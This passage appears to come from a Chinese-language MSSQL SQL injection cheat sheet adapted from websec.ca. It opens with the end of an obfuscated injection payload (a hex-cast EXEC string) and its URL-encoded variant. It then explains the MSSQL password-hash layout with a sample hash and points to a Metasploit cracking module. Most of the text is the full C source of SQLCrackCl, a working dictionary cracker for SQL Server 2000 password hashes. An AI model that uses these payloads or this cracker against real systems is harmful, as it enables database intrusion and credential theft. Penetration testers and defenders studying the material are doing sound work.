@S=CAST(0x53454c4543542031 AS VARCHAR(4000)); EXEC (@S);--</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">HTML实体(HTML Entities 待验证）</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">%26%2365%3B%26%2378%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B</td></tr></tbody></table>

### 密码散列

从0x0100密码开始，0x 后的第一个字节是一个常数,接下来的八个字节是哈希盐,剩下的80个字节是两个散列，第一40个字节是区分大小写的密码哈希值，而第二个40字节为大写形式密码哈希值。

```
0x0100236A261CE12AB57BA22A7F44CE3B780E52098378B65852892EEE91C0784B911D76BF4EB124550ACABDFD1457

```

### 密码破解

可以利用Metasploit的JTR模块进行破解

[http://www.rapid7.com/db/modules/auxiliary/analyze/jtr_mssql_fast](http://www.rapid7.com/db/modules/auxiliary/analyze/jtr_mssql_fast)

### MSSQL 2000密码破解

（此工具用于破解微软的SQL Server 2000的密码。）

```
/////////////////////////////////////////////////////////////////////////////////
//
//           SQLCrackCl
//
//           This will perform a dictionary attack against the
//           upper-cased hash for a password. Once this
//           has been discovered try all case variant to work
//           out the case sensitive password.
//
//           This code was written by David Litchfield to
//           demonstrate how Microsoft SQL Server 2000
//           passwords can be attacked. This can be
//           optimized considerably by not using the CryptoAPI.
//
//           (Compile with VC++ and link with advapi32.lib
//           Ensure the Platform SDK has been installed, too!)
//
//////////////////////////////////////////////////////////////////////////////////
#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
FILE *fd=NULL;
char *lerr = "\nLength Error!\n";
int wd=0;
int OpenPasswordFile(char *pwdfile);
int CrackPassword(char *hash);
int main(int argc, char *argv[])
{
             int err = 0;
        if(argc !=3)
                  {
                            printf("\n\n*** SQLCrack *** \n\n");
                            printf("C:\\>%s hash passwd-file\n\n",argv[0]);
                            printf("David Litchfield (david@ngssoftware.com)\n");
                            printf("24th June 2002\n");
                            return 0;
                  }
        err = OpenPasswordFile(argv[2]);
        if(err !=0)
         {
           return printf("\nThere was an error opening the password file %s\n",argv[2]);
         }
        err = CrackPassword(argv[1]);
        fclose(fd);
        printf("\n\n%d",wd);
        return 0;
}
int OpenPasswordFile(char *pwdfile)
{
        fd = fopen(pwdfile,"r");
        if(fd)
                  return 0;
        else
                  return 1;
}
int CrackPassword(char *hash)
{
        char phash[100]="";
        char pheader[8]="";
        char pkey[12]="";
        char pnorm[44]="";
        char pucase[44]="";
        char pucfirst[8]="";
        char wttf[44]="";
        char uwttf[100]="";
        char *wp=NULL;
        char *ptr=NULL;
        int cnt = 0;
        int count = 0;
        unsigned int key=0;
        unsigned int t=0;
        unsigned int address = 0;
        unsigned char cmp=0;
        unsigned char x=0;
        HCRYPTPROV hProv=0;
        HCRYPTHASH hHash;
DWORD hl=100;
unsigned char szhash[100]="";
int len=0;
if(strlen(hash) !=94)
          {
                  return printf("\nThe password hash is too short!\n");
          }
if(hash[0]==0x30 && (hash[1]== 'x' || hash[1] == 'X'))
          {
                  hash = hash + 2;
                  strncpy(pheader,hash,4);
                  printf("\nHeader\t\t: %s",pheader);
                  if(strlen(pheader)!=4)
                            return printf("%s",lerr);
                  hash = hash + 4;
                  strncpy(pkey,hash,8);
                  printf("\nRand key\t: %s",pkey);
                  if(strlen(pkey)!=8)
                            return printf("%s",lerr);
                  hash = hash + 8;
                  strncpy(pnorm,hash,40);
                  printf("\nNormal\t\t: %s",pnorm);
                  if(strlen(pnorm)!=40)
                            return printf("%s",lerr);
                  hash = hash + 40;
                  strncpy(pucase,hash,40);
                  printf("\nUpper Case\t: %s",pucase);
                  if(strlen(pucase)!=40)
                            return printf("%s",lerr);
                  strncpy(pucfirst,pucase,2);
                  sscanf(pucfirst,"%x",&cmp);
          }
else
          {
                  return printf("The password hash has an invalid format!\n");
          }
printf("\n\n       Trying...\n");
if(!CryptAcquireContextW(&hProv, NULL , NULL , PROV_RSA_FULL                 ,0))
  {
          if(GetLastError()==NTE_BAD_KEYSET)
                  {
                            // KeySet does not exist. So create a new keyset
                            if(!CryptAcquireContext(&hProv,
                                                 NULL,
                                                 NULL,
                                                 PROV_RSA_FULL,
                                                 CRYPT_NEWKEYSET ))
                               {
                                        printf("FAILLLLLLL!!!");
                                        return FALSE;
                               }
           }
}
while(1)
         {
           // get a word to try from the file
           ZeroMemory(wttf,44);
           if(!fgets(wttf,40,fd))
              return printf("\nEnd of password file. Didn't find the password.\n");
           wd++;
           len = strlen(wttf);
           wttf[len-1]=0x00;
           ZeroMemory(uwttf,84);
           // Convert the word to UNICODE
           while(count < len)
                     {
                               uwttf[cnt]=wttf[count];
                               cnt++;
                               uwttf[cnt]=0x00;
                               count++;
                               cnt++;
                     }
           len --;
           wp = &uwttf;
           sscanf(pkey,"%x",&key);
           cnt = cnt - 2;
           // Append the random stuff to the end of
           // the uppercase unicode password
           t = key >> 24;
           x = (unsigned char) t;
           uwttf[cnt]=x;
           cnt++;
           t = key << 8;
           t = t >> 24;
         x = (unsigned char) t;
         uwttf[cnt]=x;
         cnt++;
         t = key << 16;
         t = t >> 24;
         x = (unsigned char) t;
         uwttf[cnt]=x;
         cnt++;
         t = key << 24;
         t = t >> 24;
         x = (unsigned char) t;
         uwttf[cnt]=x;
         cnt++;
// Create the hash
if(!CryptCreateHash(hProv, CALG_SHA, 0 , 0, &hHash))
         {
                   printf("Error %x during CryptCreatHash!\n", GetLastError());
                   return 0;
         }
if(!CryptHashData(hHash, (BYTE *)uwttf, len*2+4, 0))
         {
                   printf("Error %x during CryptHashData!\n", GetLastError());
                   return FALSE;
         }
CryptGetHashParam(hHash,HP_HASHVAL,(byte*)szhash,&hl,0);
// Test the first byte only. Much quicker.
if(szhash[0] == cmp)
         {
                   // If first byte matches try the rest
                   ptr = pucase;
                   cnt = 1;
                   while(cnt < 20)
                   {
                               ptr = ptr + 2;
                               strncpy(pucfirst,ptr,2);
                               sscanf(pucfirst,"%x",&cmp);
                               if(szhash[cnt]==cmp)
                                        cnt ++;
                               else
                               {
                                        break;
                               }
                   }
                   if(cnt == 20)
                   {
                        // We've found the password
                        printf("\nA MATCH!!! Password is %s\n",wttf);
                        return 0;
                     }
             }
             count = 0;
             cnt=0;
           }
  return 0;
}

```

PS:英文原文内容来源于:[http://websec.ca/kb/sql_injection#MSSQL_Testing_Version](http://websec.ca/kb/sql_injection#MSSQL_Testing_Version)

楼主在原内容基础上进行了一些补充,并分享了一些在测试过程中发现的技巧.

参考来源:[http://websec.ca/kb/sql_injection#MSSQL_Testing_Version](http://websec.ca/kb/sql_injection#MSSQL_Testing_Version)[http://safe.it168.com/ss/2007-09-10/200709100935438.shtml](http://safe.it168.com/ss/2007-09-10/200709100935438.shtml)